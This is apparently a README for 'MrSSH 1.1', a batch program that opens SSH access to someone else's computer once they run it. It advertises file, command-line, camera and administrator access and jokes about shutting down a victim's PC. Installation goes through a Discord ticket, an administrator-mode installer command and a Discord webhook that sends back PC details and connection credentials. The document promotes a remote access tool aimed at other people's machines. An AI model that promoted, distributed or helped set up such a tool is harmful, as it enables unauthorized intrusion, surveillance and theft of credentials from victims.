# ❔ What is MrSSH 1.1 about?
MrSSH is a simple batch program that grants you ssh access to someone's computer (if they had ran the code earlier obviously). You can access the PC from anynetwork. Pretty much simple, right?

# ✔ The program offers
- Files access
- Cmd access
- Camera access (after installing third party software)
- Login to administrator account (you can do literally anything)
- Shutdown someones pc wile they're playing fortnite lol

### 🧵 Installation
To begin the installation you got to join our discord server
><a href="https://discord.gg/QYxttzVd7N" rel="Discord Server">![Server](https://img.shields.io/discord/907726035099996160.svg?label=Discord&amp;colorB=7289DA)</a>

Type `!ticket` in [#commands](https://discord.com/channels/907726035099996160/907727546274168892)

After opening a ticket you have to specify a [webhook URL](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks). So we can create an identifier for you. 

### 🏃‍♂️ Running

After the staff creates your token you will receive a message with a command - installer command.
To run MrSSH open cmd **in administrator mode** and enter your command. After 2-7 minutes, discord webhook should send PC info and connection credidentals.

You are also allowed to ask staff for them to make a batch version file (Batch file also has to be runned in administrator mode).
